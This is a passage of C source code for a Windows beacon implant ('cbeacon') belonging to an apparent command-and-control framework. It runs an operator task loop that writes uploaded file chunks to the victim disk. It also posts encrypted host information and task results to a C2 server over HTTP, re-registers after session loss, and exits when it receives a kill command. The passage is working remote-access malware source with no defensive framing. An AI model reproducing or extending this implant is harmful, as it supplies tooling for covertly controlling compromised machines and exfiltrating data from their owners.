                                                    } else if (chain_verify_upload(t.id, raw, blen, t.prev_mac, t.mac) != 0) {
                                                        robj = emit_error_result(t.id, "upload", "chunk HMAC mismatch (tampered/reordered data)", rid);
                                                        cng_wipe(raw, blen);
                                                        free(raw);
                                                    } else {
                                                        HANDLE h;
                                                        LARGE_INTEGER li;
                                                        if (t.offset <= 0)
                                                            h = CreateFileA(pp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                                        else
                                                            h = CreateFileA(pp, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                                        if (h == INVALID_HANDLE_VALUE) {
                                                            robj = emit_error_result(t.id, "upload", "cannot write file", rid);
                                                        } else {
                                                            DWORD wr = 0;
                                                            int ok = 1;
                                                            if (t.offset > 0) {
                                                                li.QuadPart = t.offset;
                                                                if (!SetFilePointerEx(h, li, NULL, FILE_BEGIN)) ok = 0;
                                                            }
                                                            if (ok && (!WriteFile(h, raw, blen, &wr, NULL) || wr != blen)) ok = 0;
                                                            CloseHandle(h);
                                                            robj = ok ? emit_text_result(t.id, "upload", "File chunk uploaded successfully", rid)
                                                                        : emit_error_result(t.id, "upload", "write failed", rid);
                                                        }
                                                        cng_wipe(raw, blen);
                                                        free(raw);
                                                    }
                                                }
                                            } else {
                                                char msg[128];
                                                _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
                                                robj = emit_error_result(t.id, t.type, msg, rid);
                                            }
                                            if (robj) {
                                                size_t need = strlen(newres) + strlen(robj) + 2;
                                                char *nr = (char *)realloc(newres, need);
                                                if (nr) {
                                                    newres = nr;
                                                    if (newres[0]) strcat_s(newres, need, ",");
                                                    strcat_s(newres, need, robj);
                                                }
                                                free(robj);
                                            }
                                            free(rid);
                                            free_task(&t);
                                            if (kill_now) {
                                                p = next ? next : p + 1;
                                                break;
                                            }
                                            p = next ? next : p + 1;
                                        }
                                    }
                                    free(results);
                                    results = newres;
                                    if (kill_now) {
                                        /* Best-effort final delivery like Go handleKill, then exit. */
                                        char *info = build_info_json();
                                        if (info) {
                                            size_t icap = strlen(results) + INFO_CAP + 512;
                                            char *inner = (char *)malloc(icap);
                                            if (inner) {
                                                unsigned long long fs = 0;
                                                char *fr = NULL;
                                                DWORD rl = 0;
                                                _snprintf(inner, icap, "{\"uuid\":\"%s\",\"pv\":2,\"info\":{%s},\"results\":[%s]}", g_uuid, info, results);
                                                fr = build_encrypted(inner, &fs);
                                                if (fr) { char *rp = http_post(fr, (DWORD)strlen(fr), &rl); if (rp) free(rp); free(fr); }
                                                free(inner);
                                            }
                                            free(info);
                                        }
                                        free(resp);
                                        free(results);
                                        ExitProcess(0);
                                    }
                                }
                            }
                        }
                    } else {
                        /* decrypt failed: drop session, re-register next loop */
                        g_have_session = 0;
                        g_registered = 0;
                    }
                }
                if (blob) free(blob);
                if (pt) free(pt);
            } else {
                /* no ciphertext: resync envelope or session loss -> re-register */
                g_have_session = 0;
                g_registered = 0;
            }
            free(c64);
        }
        if (strstr(resp, "kill_switch")) {
            fprintf(stderr, "[cbeacon] kill-switch armed, exiting\n");
            free(resp);
            return 0;
        }
        free(resp);
        do_sleep_interval();
    }
}
